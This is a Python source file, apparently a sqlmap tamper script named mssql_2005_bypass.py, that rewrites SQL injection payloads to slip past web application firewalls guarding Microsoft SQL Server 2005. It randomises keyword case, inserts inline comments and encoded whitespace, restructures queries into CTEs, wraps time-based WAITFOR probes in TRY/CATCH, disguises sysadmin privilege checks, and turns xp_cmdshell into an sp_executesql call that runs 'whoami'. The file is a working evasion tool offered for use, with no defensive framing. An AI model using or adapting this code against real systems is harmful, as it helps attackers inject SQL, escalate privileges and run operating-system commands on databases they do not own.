#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : mssql_2005_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import re
import random
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def general_obfuscate(payload):
    if not payload:
        return payload

    def case_folding(match):
        word = match.group(0)
        return "".join(c.upper() if random.getrandbits(1) else c.lower() for c in word)
    
    keywords = r"\b(SELECT|FROM|WHERE|AND|OR|UNION|INSERT|UPDATE|DELETE|DROP|EXEC|DECLARE|WAITFOR|DELAY|TOP|WITH|TRY|CATCH|APPLY|OVER|ROW_NUMBER|ORDER|BY|CTE|IS_SRVROLEMEMBER|SYS\.TABLES|SYS\.COLUMNS|INFORMATION_SCHEMA|COLUMNS|TABLE_NAME)\b"
    payload = re.sub(keywords, case_folding, payload, flags=re.IGNORECASE)

    payload = re.sub(r"(?i)\bLEN\(", "DATALENGTH(", payload)
    payload = re.sub(r"(?i)\bGETDATE\(\)", "SYSDATETIME()", payload)
    payload = re.sub(r"(?i)\bISNULL\(", "COALESCE(", payload)

    def comment_splitter(match):
        word = match.group(0)
        if len(word) > 3:
            pos = random.randint(1, len(word) - 1)
            return word[:pos] + "/*" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(3)) + "*/" + word[pos:]
        return word
    
    payload = re.sub(keywords, comment_splitter, payload, flags=re.IGNORECASE)

    def whitespace_replacer(match):
        choices = ["/**/", "%09", "%0a", "/**/ /*!*/ /**/"]
        return random.choice(choices)
    
    payload = re.sub(r"\s+", whitespace_replacer, payload)

    return payload

def tamper(payload, **kwargs):
    if not payload:
        return payload

    if "SELECT" in payload.upper() and "WITH" not in payload.upper():
        payload = re.sub(r"(?i)SELECT\s+(.+)\s+FROM\s+(.+)", r";WITH cte AS (SELECT \1 FROM \2) SELECT * FROM cte", payload)

    if "WAITFOR" in payload.upper():
        payload = "BEGIN TRY %s END TRY BEGIN CATCH SELECT ERROR_MESSAGE() END CATCH" % payload

    if "IS_SRVROLEMEMBER" in payload.upper():
        payload = re.sub(r"IS_SRVROLEMEMBER\('sysadmin'\)", r"a.is_admin FROM (SELECT 1 as t) t CROSS APPLY (SELECT IS_SRVROLEMEMBER('sysadmin') AS is_admin) a", payload)

    if "TOP 1" in payload.upper():
        payload = re.sub(r"(?i)SELECT\s+TOP\s+1\s+(.+)\s+FROM\s+(.+)", r"SELECT \1 FROM (SELECT \1, ROW_NUMBER() OVER(ORDER BY (SELECT NULL)) AS rn FROM \2) t WHERE rn=1", payload)

    if "xp_cmdshell" in payload.lower():
        payload = payload.replace("xp_cmdshell", "sp_executesql N'EXEC xp_cmdshell ''whoami'''")

    payload = general_obfuscate(payload)

    return payload
